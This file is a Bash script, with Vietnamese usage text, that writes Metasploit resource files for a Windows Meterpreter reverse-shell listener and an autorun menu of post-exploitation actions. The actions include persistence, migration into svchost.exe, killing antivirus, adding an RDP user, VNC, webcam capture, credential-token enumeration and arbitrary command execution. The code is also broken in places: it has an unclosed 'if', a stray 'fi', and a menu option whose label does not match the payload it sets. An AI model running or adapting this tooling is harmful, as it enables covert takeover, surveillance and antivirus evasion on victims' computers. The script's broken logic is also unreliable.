#!/bin/bash
######Color##########
cyan='\e[0;36m'
green='\e[0;34m'
okegreen='\033[92m'
lightgreen='\e[1;32m'
white='\e[1;37m'
red='\e[1;31m'
yellow='\e[0;33m'
BlueF='\e[1;34m' #Biru
RESET="\033[00m" #normal
orange='\e[38;5;166m'
#######################
path=`pwd`
rcf=$path/script-listerning.rc
rcs=$path/auto-script.rc
payload_available="windows/meterpreter/reverse_tcp"
source $path/config
source $path/../configLanguage
######################
#language
if [ "$language" = "VN" ]; then
source $path/../../language/VietNamese/VN
source $path/../../language/VietNamese/vn_table
elif [ "$language" = "EN" ]; then
source $path/../../language/English/EN
source $path/../../language/English/en_table
fi
######### Functions #########
function windows {
	rm -rf $rcf
	touch $rcf
	rm -rf $rcs
	touch $rcs
	sleep 1

	echo "use exploit/multi/handler" > $rcf

	echo "1/  windows/meterpreter/reverse_tcp"
	echo "2/  windows/meterpreter/reverse_http"
	echo "o/ other"
	while true; do
		echo -ne "$choose_answer"
		read choose
		case $choose in
			1)
				echo "set PAYLOAD windows/meterpreter/reverse_http" >> $rcf
				set_handler;;
			2)
				echo "set PAYLOAD windows/meterpreter/reverse_http" >> $rcf
				set_handler;;
			o)	
				guide
				while true; do
					echo -ne "death-note > "
					read value
					case $value in
						check);;
						search);;
						show);;
						use);;
						exit)	break;;

							
					esac
				done

					echo -ne ""
					read payload
					if [ "$payload" == "$payload_available" ]
		esac
	done
}

function set_handler {
				echo -ne "set lhost :"
				read LhOsT
				echo -ne "set lport :"
				read LpOrT
				echo -ne "	$message3"
				echo "set LHOST $LhOsT" >> $rcf
				echo "set LPORT $LpOrT" >> $rcf
				echo "set ExitOnSession false" >> $rcf
				echo -ne "	$message5"
				read a	
					while [ "$a" != "yes" ] || [ "$a" != "no" ]; do	
						if [ "$a" = "yes" ]; then 
						autoscript
						echo "set AutoRunScript multi_console_command -r $rcs" >> $rcf
						break
						elif [ "$a" = "no" ]; then
						echo "$StartMulti"			
						break
						fi
						echo -e "$error1";
						read a
					done
				echo "exploit -j -z" >> $rcf
					fi
}


function guide {
cat << !
		Cách dùng :
			check    :		Kiểm tra có Payload này trong danh sách không
			search	 :		Tìm kiếm Payload theo từ khóa
			show	 :		In ra tất cả các Payload theo HĐH hoặc theo ngôn ngữ lập trình
		    show all :	  	In ra tất cả các Payload trong danh sách
		    use 	 :		Sử dụng Payload
		    exit  	 :		Thoát
		Ví dụ :
			check windows/meterpreter/reverse_http
			search reverse_http
			show python
			use windows/meterpreter/reverse_http
!
}


function autoscript {
					##=== MIGRATE ==##
		function migrate {
			migrate_table
				while true; do
					echo -ne "$choose_answer"
					read answer
					case $answer in
					a)
						echo "run post/windows/manage/migrate" >> $rcs
			   			echo -e "=====> OK <=====";
						break;;
					b)
						echo "run post/windows/manage/archmigrate" >> $rcs
						echo -e "=====> OK <=====";
						break;;
					c)		echo -en "$question_aname"
							while true; do
							read yn
							case $yn in		
							y|Y|Yes|yes|YES) echo -e "$import_aname"
								read aname; break;;
							n|N|No|no|NO) aname="svchost.exe" ; break ;;
							*) echo -e "$error1";
							esac
							done
							echo -en "$question_name"
							while true; do
							read yn
							case $yn in		
							y|Y|Yes|yes|YES) echo -e "$import_name"
								read name; break;;
							n|N|No|no|NO) name="explorer.exe" ; break ;;
							*) echo -e "$error1";
							esac
							done
						echo "run post/windows/manage/priv_migrate ANAME=$aname NAME=$name nofail=true" >> $rcs
						echo -e "=====> OK <=====";
						break;;
					*) echo -e "$error1";
					esac
				done
 			}
		######################### Auto script ###########################################################		
			echo -e "$ask_choose_script"
			table					
			while true; do
			echo -ne "***"
			read choose_script
			case $choose_script in
			1) 
			   echo -ne "$Newport"
			   read newLPORT
			   echo "run exploits/windows/local/persistence LPORT=$newLPORT" >> $rcs
			   echo -e "=====> OK <=====";;
			2) migrate;;
			3)
			   echo "run killav" >> $rcs
			   echo -e "=====> OK <=====";;	
		        4)  echo -ne "$use"
				read Username
			   echo -ne "$pass"
				read Password
			   echo "run getgui -e" >> $rcs
			   echo "run getgui -u $Username -p $Password" >> $rcs
			   echo -e "=====> OK <=====";;	
			5)
			   echo "run vnc" >> $rcs
			   echo "run vnc" >> $rcs
			   echo -e "=====> OK <=====";;
			6) 
			   echo "run post/windows/gather/checkvm" >> $rcs
			   echo -e "=====> OK <=====";;
			7) 
			   echo -ne "$Path_wallpaper"
			   read path_wallpaper
			   echo "run post/multi/manage/set_wallpaper WALLPAPER_FILE=$path_wallpaper" >> $rcs
			   echo -e "=====> OK <=====";;			   
			8) read auto_command
			   echo "run post/multi/general/execute COMMAND=$auto_command" >> $rcs
			   echo -e "=====> OK <=====";;
			9) 
			   echo -ne "$input_path_lfile"
			   read path_lfile
			   echo -ne "$input_path_rfile"
			   read path_rfile
			   echo -ne "$input_proxy"
			   read proxy
			   echo -ne "$input_port"
			   read port
			if [ "$path_rfile" = "" ]; then
			   echo "run post/multi/manage/upload_injectCA LFILE=$path_lfile ProxyServer=$proxy ProxyPort=$port" >> $rcs
			else 
			   echo "run post/multi/manage/upload_injectCA LFILE=$path_lfile RFILE=$rfile ProxyServer=$proxy ProxyPort=$port" >> $rcs
			fi
			   echo -e "=====> OK <=====";;
			10) 
			   echo "run post/multi/gather/env" >> $rcs
			   echo -e "=====> OK <=====";;
			11) 
			   echo "run post/windows/gather/enum_tokens" >> $rcs
			   echo -e "=====> OK <=====";;
			12) 
			   echo "run post/windows/gather/enum_shares" >> $rcs
			   echo -e "=====> OK <=====";;
			13) 
			   echo "run post/windows/gather/enum_applications" >> $rcs
			   echo -e "=====> OK <=====";;
			14) 
			   echo "run post/windows/gather/enum_powershell_env" >> $rcs
			   echo -e "=====> OK <=====";;
			15) 
			   echo "run post/multi/recon/local_exploit_suggester" >> $rcs
			   echo -e "=====> OK <=====";;	
			16) 
			   echo "run post/multi/gather/wlan_geolocate" >> $rcs
			   echo -e "=====> OK <=====";;
			17)
			   echo -ne "$Path_youtube"
			   read path_youtube
			   echo "run post/multi/manage/play_youtube VID=$path_youtube" >> $rcs
			   echo -e "=====> OK <=====";;
			18)
			   echo -ne "$Quality"
			   read QuaLiTy
			   echo "run post/windows/manage/webcam QUALITY=$QuaLiTy" >> $rcs
			   echo -e "=====> OK <=====";;
			99)
				break;;
			*) echo -e "$error1";
			esac			
			done
			 echo -e "[$red*$RESET] Stating Listerning with metasploit" 
				
}
service postgresql start
resize -s 40 105 > /dev/null
windows
cd ../../Victim/
#xterm -fa monaco -fs 13 -bg black -e msfconsole -r $rcf
msfconsole -r $rcf
